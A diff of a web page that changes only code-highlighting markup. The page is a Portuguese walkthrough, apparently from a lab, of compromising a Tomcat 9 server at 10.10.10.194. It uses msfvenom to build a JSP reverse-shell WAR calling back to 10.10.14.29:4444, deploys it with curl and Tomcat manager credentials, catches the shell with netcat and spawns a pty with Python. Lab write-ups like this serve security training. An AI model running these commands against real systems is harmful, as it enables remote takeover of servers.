@@ -251,69 +251,69 @@ fetchInject(["/js/lazysizes.min.js"]);
   <header>
     <h1>sh_MSFvenom</h1>
   </header>
-  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.29 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f war &gt; exploit.war
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#IP do seu local host + porta</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Criação do arquivo .WAR</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>curl --user <span style="color:#e6db74">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> --upload-file exploit.war <span style="color:#e6db74">&#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#O ataque foi em um alvo cujo tomcat9 estava vulneravel</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#IP do RHOST(alvo) + porta da aplicação</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#upload do arquivo .war</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;------------------------------------sucesso no upload -----------------------------------------------------&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;----------------------------------- http://10.10.10.194:8080/exploit.war  ---------------------------------------------&#34;</span>
-</span></span><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">4444</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#em outra aba do terminal, deixe escutando na porta que desejar </span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># nc -nvlp 4444</span>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.29 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f war &gt; exploit.war
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#IP do seu local host + porta</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#Criação do arquivo .WAR</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">curl --user <span class="s1">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> --upload-file exploit.war <span class="s2">&#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#O ataque foi em um alvo cujo tomcat9 estava vulneravel</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#IP do RHOST(alvo) + porta da aplicação</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#upload do arquivo .war</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;------------------------------------sucesso no upload -----------------------------------------------------&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;----------------------------------- http://10.10.10.194:8080/exploit.war  ---------------------------------------------&#34;</span>
+</span></span><span class="line"><span class="cl">nc -nvlp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#em outra aba do terminal, deixe escutando na porta que desejar </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># nc -nvlp 4444</span>
 </span></span></code></pre></div><p>Quando estiver ouvindo a porta, vá no navegador e acesse o arquivo que você acabou de fazer o upload:</p>
 <p><code>http://10.10.10.194:8080/exploit.war/</code></p>
 <p>Volte ao terminal — ele terá conectado via shell. Agora execute o shell reverso em Python para obter um terminal interativo:</p>
 <pre tabindex="0"><code>listening on [any] 4444 ...
 connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
 </span></span></code></pre></div>
 </main>
     <footer>
